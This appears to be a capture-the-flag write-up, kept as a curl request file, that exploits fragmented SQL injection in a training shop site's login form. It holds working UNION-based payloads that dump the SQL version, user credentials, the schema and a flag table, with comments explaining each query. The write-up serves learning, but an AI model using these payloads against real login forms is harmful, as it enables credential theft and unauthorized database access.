@@ -1,0 +1,49 @@
+# To quickly curl from this file, use this extension on VSCode: https://marketplace.visualstudio.com/items?itemName=humao.rest-client
+
+# Reading the source code, we find Fragmented SQL Injection
+# Original query: select username from users where username='abc' and password='xyz'
+# We now know there are column `username` and `password` in table `users`
+
+# Good reads for this SQL injection
+# https://www.netsparker.com/blog/web-security/fragmented-sql-injection-attacks/
+# https://security.stackexchange.com/questions/135077/how-to-extract-information-using-a-sql-injection-on-php
+
+# Flow to test: login to inject -> go to shopping.php to check result -> logout -> login again with another injection...
+
+### Shopping.php
+curl 'http://shop.kid.cyberjutsu-lab.tech/shopping.php'
+
+### Logout.php
+curl 'http://shop.kid.cyberjutsu-lab.tech/logout.php'
+
+######## Injections ########
+### View SQL version
+curl 'http://shop.kid.cyberjutsu-lab.tech/login.php' \
+  --data-raw 'username=\&password=and 0 UNION select @@VERSION;#'
+
+# the query now is: select username from users where username='\' and password='and 0 UNION select @@VERSION;#'
+# which can be reduced to:
+# select username from users where username=''and 0 UNION select @@VERSION;#
+
+### Check all username & password to see if there's a flag
+curl 'http://shop.kid.cyberjutsu-lab.tech/login.php' \
+  --data-raw 'username=\&password=and 0 UNION select GROUP_CONCAT(username,0x7e,password) FROM users;#'
+# Nothing found here...
+
+### Let's the database schema
+curl 'http://shop.kid.cyberjutsu-lab.tech/login.php' \
+  --data-raw 'username=\&password=and 0 UNION select GROUP_CONCAT(table_name,0x7e,column_name) FROM information_schema.columns WHERE table_schema=database();#'
+# Found a table with "flag" name? Let's try.
+
+###
+curl 'http://shop.kid.cyberjutsu-lab.tech/login.php' \
+  --data-raw 'username=\&password=and 0 UNION select flag_3e53dc FROM flag_304ad593;#'
+
+# yay.
+
+# What I've learned
+# * I should learn more about db types (MySQL, SQL, Oracle...)
+# * GROUP_CONCAT is amazing
+# * UNION is super helpful while injecting and getting info from DB
+# * This query is a godsend: select GROUP_CONCAT(table_name,0x7e,column_name) FROM information_schema.columns WHERE table_schema=database();
+# And of course don't reinvent the wheel.
